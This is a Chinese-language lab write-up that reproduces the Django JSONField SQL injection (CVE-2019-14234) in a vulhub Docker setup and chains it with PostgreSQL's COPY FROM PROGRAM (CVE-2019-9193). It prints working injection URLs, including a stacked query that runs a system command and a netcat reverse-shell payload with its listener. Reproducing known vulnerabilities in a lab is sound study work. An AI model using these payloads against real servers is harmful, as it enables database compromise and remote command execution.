


基于vulhub复现Django JSONField SQL注入漏洞（CVE-2019-14234）

## 漏洞概述：

该漏洞需要开发者使用了JSONField/HStoreField，且用户可控queryset查询时的键名，在键名的位置注入SQL语句。

Django通常搭配postgresql数据库，而JSONField是该数据库的一种数据类型。该漏洞的出现的原因在于Django中JSONField类的实现，Django的model最本质的作用是生成SQL语句，而在Django通过JSONField生成sql语句时，是通过简单的字符串拼接。

![](https://i0.hdslb.com/bfs/article/ab6eb4f3584a62da05297df5ba8e403af226558b.png@1320w_876h.png)

通过JSONField类获得KeyTransform类并生成sql语句的位置。

其中key_name是可控的字符串，最终生成的语句是WHERE (field->'[key_name]') = 'value'，因此可以进行SQL注入。

## 影响范围：

Django (1.11.x) Version < 1.11.23
Django (2.1.x) Version < 2.1.11
Django (2.2.x) Version < 2.2.4

## 漏洞复现

### 部署环境

可以使用docker vulhub快速部署 

    cd /vulhub-master/django/CVE-2019-14234
    docker-compose build
    docker-compose up -d

访问127.0.0.1:8000

### 漏洞复现

登录环境

访问：http://127.0.0.1:8000/admin/vuln/collection/ 输入默认账户密码
账户：adimin
密码：a123123123

登录成功后看到以下界面：

![](https://i0.hdslb.com/bfs/article/3fb64ee63ffac6e99425e8e492dbe143ae958f5d.png@1320w_412h.png)

构造报错语句：
使用GET参数构造detail__a'b=123提交，其中detail是模型Collection中的JSONField：

http://127.0.0.1:8000/admin/vuln/collection/?detail__a%27b=123

构造的语句提交后回显数据库报错，证明SQL语句被执行：

![](https://i0.hdslb.com/bfs/article/14cc106521ba7cd460e92e80b4d0510303ec2795.png@1320w_470h.png)

CVE-2019-9193：具有数据库服务器文件读取权限的攻击者可以利用此漏洞执行任意系统命令，该漏洞由 PostgreSQL 引发 

思路稍加扩展，我们可以利用CVE-2019-14234(SQL注入漏洞)向服务器传送包含CVE-2019-9193(命令执行漏洞)系统命令的SQL语句，从而利用SQL语句，执行任意系统命令。  

构造命令执行语句： 

    http://127.0.0.1:8000/admin/vuln/collection/?detail__title')%3d'1' or 1%3d1 %3bcopy cmd_exec FROM PROGRAM 'touch /tmp/vuln.txt'--%20  

命令执行结果：当提示“no results to fetch”即为执行成功。 

![](https://i0.hdslb.com/bfs/article/cbf3027fde7903ef178ddabf8e9b6921eab72d4f.png@1320w_416h.png)

进入docker的postgres容器可以看到/tmp目录下生成了vuln.txt文件

"touch /tmp/vuln.txt"即为系统命令，可以替换成其他命令并且执行，例如配合 nc 命令获取shell。  

    nc -l -p 9999
    http://127.0.0.1:8000/admin/vuln/collection/?detail__title')%3d'1' or 1%3d1 %3bcopy cmd_exec FROM PROGRAM 'nc ip 9999 -e /bin/sh'--%20  



## 参考文档

[Django JSONField SQL注入漏洞（CVE-2019-14234）分析与影响](https://www.leavesongs.com/PENETRATION/django-jsonfield-cve-2019-14234.html)
[CVE-2019-14234 | Django JSON SQL注入漏洞 & 任意系统命令执行](https://www.bilibili.com/read/cv4579255/)
[CVE-2019-14234 Django JSONField SQL注入漏洞复现](https://blog.csdn.net/m0_48520508/article/details/107639153)